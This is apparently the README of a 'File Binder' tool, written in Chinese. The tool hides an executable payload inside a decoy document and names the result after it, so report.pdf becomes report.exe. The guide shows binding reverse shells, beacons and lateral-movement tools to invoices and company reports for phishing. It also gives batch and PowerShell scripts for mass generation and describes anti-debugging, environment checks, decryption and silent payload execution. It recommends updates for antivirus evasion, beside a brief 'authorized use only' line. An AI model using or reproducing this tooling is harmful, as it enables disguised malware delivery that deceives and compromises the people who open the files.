# 使用指南

本文档详细介绍如何使用 File Binder 工具。

## 🚀 快速开始

### 基本用法

最简单的使用方法：

```bash
./binder.exe -p payload.exe -f document.pdf
```

这将创建一个名为 `document.exe` 的文件在 `result/` 目录中。

### 完整命令示例

```bash
# 指定所有参数
./binder.exe -p malware.exe -f report.pdf -o output_folder

# 使用长参数名
./binder.exe --payload malware.exe --file report.pdf --output custom_output
```

## 📋 参数详解

### 必需参数

- **`-p, --payload`**: 要捆绑的可执行文件
  - 必须是 `.exe` 格式
  - 文件必须存在且可读

- **`-f, --file`**: 要捆绑的普通文件
  - 支持任意格式（PDF、图片、文档等）
  - 文件大小建议不超过50MB

### 可选参数

- **`-o, --output`**: 输出目录
  - 默认值：`result`
  - 如果目录不存在会自动创建

## 📁 输出文件

### 生成的文件

运行后会在输出目录生成两个文件：

1. **`[filename].exe`** - 最终的捆绑文件
2. **`[random].go`** - 生成的Go源码（可删除）

### 文件命名规则

输出的exe文件名基于普通文件的名称：
- `document.pdf` → `document.exe`
- `image.jpg` → `image.exe`
- `report.docx` → `report.exe`

## 🔧 工作流程

### 1. 编译工具

```bash
go build -o binder.exe cmd/binder/main.go
```

### 2. 准备文件

确保你有：
- 一个 `.exe` 格式的payload文件
- 一个用作伪装的普通文件

### 3. 执行捆绑

```bash
./binder.exe -p payload.exe -f document.pdf
```

### 4. 获取结果

检查 `result/` 目录中的生成文件。

## 📖 使用场景

### 安全测试

```bash
# 测试反病毒检测
./binder.exe -p test_payload.exe -f legitimate_document.pdf

# 社会工程学测试
./binder.exe -p beacon.exe -f invoice.pdf
```

### 渗透测试

```bash
# 生成用于钓鱼的文件
./binder.exe -p reverse_shell.exe -f company_report.docx

# 内网横向移动测试
./binder.exe -p lateral_tool.exe -f system_manual.pdf
```

## ⚠️ 注意事项

### 文件大小限制

- payload文件：建议不超过100MB
- 普通文件：建议不超过50MB
- 生成的文件会比原始文件大约大20-30%

### 兼容性

- **操作系统**: 仅支持Windows
- **架构**: x64
- **权限**: 普通用户权限即可

### 安全建议

1. **仅在授权环境中使用**
2. **定期更新工具以获得最新的免杀技术**
3. **不要在生产环境中测试**
4. **遵守当地法律法规**

## 🛠️ 故障排除

### 常见错误

#### 编译失败

```
[ERR] 捆绑文件编译失败: exit status 1
```

**解决方案:**
1. 检查Go环境是否正确安装
2. 确保有足够的磁盘空间
3. 检查输出目录权限

#### 文件不存在

```
[FTL] 文件 payload.exe 不存在
```

**解决方案:**
1. 检查文件路径是否正确
2. 确保文件存在且可读
3. 使用绝对路径

#### 权限不足

```
[ERR] 创建输出目录失败
```

**解决方案:**
1. 以管理员权限运行
2. 检查目标目录权限
3. 更改输出目录到有写权限的位置

### 调试技巧

#### 查看详细日志

生成的文件在特定情况下会产生调试日志：

```bash
# 检查临时目录中的日志
dir %TEMP%\payload_*.log
```

#### 验证生成的文件

```bash
# 检查文件是否正确生成
dir result\
file result\document.exe
```

## 📚 进阶用法

### 批量处理

创建批处理脚本：

```batch
@echo off
for %%f in (*.pdf) do (
    binder.exe -p payload.exe -f "%%f" -o batch_output
)
```

### 自动化脚本

PowerShell脚本示例：

```powershell
$payloads = Get-ChildItem "payloads\*.exe"
$docs = Get-ChildItem "documents\*.*"

foreach ($payload in $payloads) {
    foreach ($doc in $docs) {
        $output = "output\$($payload.BaseName)_$($doc.BaseName)"
        .\binder.exe -p $payload.FullName -f $doc.FullName -o $output
    }
}
```

## 🔍 技术原理

### 加密过程

1. 生成32字节随机密钥
2. 使用AES-GCM加密两个文件
3. 将加密数据嵌入Go模板
4. 编译生成最终exe文件

### 运行时行为

1. 反调试检测
2. 环境检查
3. 解密文件数据
4. 释放普通文件并打开
5. 异步执行payload
6. 清理临时文件

---

如有更多问题，请查看 [FAQ](FAQ.md) 或提交 [Issue](https://github.com/2js56/file-binder/issues)。
